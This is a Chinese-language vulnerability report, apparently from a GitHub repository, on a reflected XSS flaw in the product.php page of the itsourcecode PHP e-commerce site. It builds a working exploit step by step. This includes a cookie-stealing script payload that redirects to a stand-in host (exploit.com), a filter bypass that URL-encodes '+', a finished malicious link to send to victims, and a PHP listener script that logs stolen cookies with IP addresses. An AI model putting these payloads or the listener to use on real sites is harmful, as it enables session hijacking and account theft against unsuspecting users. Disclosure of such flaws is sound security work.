0x01 Vulnerability descrition

    itsourcecode中存在很多开源cms框架。
	在开源框架e-commerce-website-in-php-with-source-code中存在XSS漏洞，即跨站脚本攻击。
	攻击者通过向web页面插入恶意javascript代码，导致用户访问时触发该代码，从而获取用户cookie达到攻击的目的。

0x02 Recurrence of the vulnerability

    这是存在XSS漏洞的页面。
	该页面在本地服务器的路径为：http://itscode.com/ecommerce/product.php?product=dell-inspiron-15-5000-15。
![1.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-1.png)

    在搜索框或者URL对话框中输入payload："><sCrIpT>alert(1)</sCrIpT>会出现alert弹窗，因此存在XSS漏洞。
![2.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-2.png)

「EXP」
 
 目的：用户通过点击攻击者构造的恶意URL链接，使自身的cookie泄漏被攻击者利用。
    
    将payload改为"><sCrIpT>alert(document.cookie)</sCrIpT>。
	我们能在弹窗看到用户cookie信息（网页没有登录，因此只返回SESSION信息）。
![3.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-3.png)
    
    在本地搭建监听服务器，用于接收目标用户的cookie信息。
    服务器上编写一个远程接收cookie信息的php脚本getcookie.php。
	这个脚本的作用是将接收到的cookie写入到文本cookie.txt中。
	此时payload为："><sCrIpT>document.location='http://exploit.com/get.php?cookie='+document.cookie</sCrIpT>。
    我们将该payload拓展到URL中进行请求，发现远程服务器的cookie.txt文件中没有用户的cookie。
	查看网页源代码，发现我们构造的script标签中“+”被过滤。
![4.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-4.png)
  
    因此尝试将“+”转换为URL编码方式“%2B”。
	构造出新的payload："><sCrIpT>document.location='http://exploit.com/get.php?cookie='%2Bdocument.cookie</sCrIpT>
    在网页中输入payload。
![5.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-5.png)
    
    网页发生了转跳。
![6.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-6.png)
    
    此时用户cookie已经被发送到本地的监听服务器中。
![7.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-7.png)
    
    
    将payload和网页URL合并，构造出一个URL恶意链接：
	http://itscode.com/ecommerce/product.php?product=dell-inspiron-15-5000-15？"><sCrIpT>document.location='http://exploit.com/get.php?cookie='%2Bdocument.cookie</sCrIpT>
    用户通过点击该恶意链接导致自身cookie的泄漏。
	
附上一个简单cookie.php脚本
	
	<?php
	$cookie = $_GET['cookie'];
	$ip = getenv ('REMOTE_ADDR');
	$time = date('Y-m-d g:i:s');
	$fp = fopen("cookie.txt","a");
	fwrite($fp,"IP: ".$ip."Date: ".$time." Cookie:".$cookie."\n");
	fclose($fp);
	?> 
